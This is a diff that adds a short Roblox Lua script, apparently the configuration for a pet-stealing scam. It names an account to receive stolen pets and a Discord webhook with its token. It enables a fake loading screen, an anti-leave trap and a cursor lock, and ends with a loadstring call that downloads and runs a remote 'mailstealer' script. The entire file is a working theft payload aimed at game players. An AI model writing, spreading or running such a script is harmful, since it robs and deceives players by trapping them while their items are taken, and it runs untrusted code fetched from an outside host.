@@ -1,0 +1,14 @@
+--[[ Main Config ]]--
+_G.UserName = "EnderShadow007123" --// Username To Send Pets To
+_G.UserName2 = "EnderShadow007123" --// Username To Send Pets To [OPTIONAL]
+
+--[[ Webhook ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1133931887556051034/B22LeoRDaFTT32dkHoHyTaoLfMuHoo-AUdqan19hWRzo__6bn062CVIigkxcfFbxt8mO" --// Discord Webhook For Executions
+
+--[[ Other Config (recommended not changing ]]--
+_G.LoadingScreen = true --// Replace the true with false if you don't want the loading screen
+_G.AntiLeave = true --// Replace the true with false if you don't want to make the user not leave 
+_G.MouseLock = true --// Replace the true with false if you don't want the cursor to be locked / cant move
+
+--[[ DO NOT CHANGE ]]--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Arkhalislua/Arkhalislua.github.io/main/arkhalis_mailstealer.lua", true))()
